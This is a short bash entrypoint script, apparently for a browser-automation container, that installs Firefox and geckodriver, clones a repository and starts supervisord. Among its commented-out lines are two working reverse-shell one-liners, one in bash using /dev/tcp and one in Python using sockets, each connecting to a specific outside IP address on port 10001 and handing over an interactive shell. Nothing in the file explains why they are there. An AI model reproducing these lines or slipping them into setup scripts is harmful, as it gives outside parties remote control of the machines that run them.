#!/bin/bash
# mkdir -p /root/EXTRAT/
# mkdir -p /root/EXTRAT/firefox-97.0.1/


# wget -q https://ftp.mozilla.org/pub/firefox/releases/97.0.1/linux-x86_64/en-GB/firefox-97.0.1.tar.bz2 && tar -xf firefox-97.0.1.tar.bz2 -C /root/EXTRAT/firefox-97.0.1/

# #bash -i >& /dev/tcp/197.202.207.91/10001 0>&1
# cd /root/
# git clone https://github.com/GH0STAV0/SDA_ALL.git /root/SDA_ALL
# wget -q https://github.com/mozilla/geckodriver/releases/download/v0.32.0/geckodriver-v0.32.0-linux64.tar.gz && tar -xf geckodriver-v0.32.0-linux64.tar.gz
# rm geckodriver-v0.32.0-linux64.tar.gz
# chmod +x geckodriver
# mv geckodriver /usr/bin/geckodriver-30

#supervisord -n
#python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("105.111.63.126",10001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#chown root:root /etc/resolv.conf
#echo -e "nameserver 8.8.8.8\nnameserver 8.8.4.4" >>  /etc/resolv.conf
###########################################
/usr/bin/supervisord -n -c  /etc/supervisor/supervisord.conf
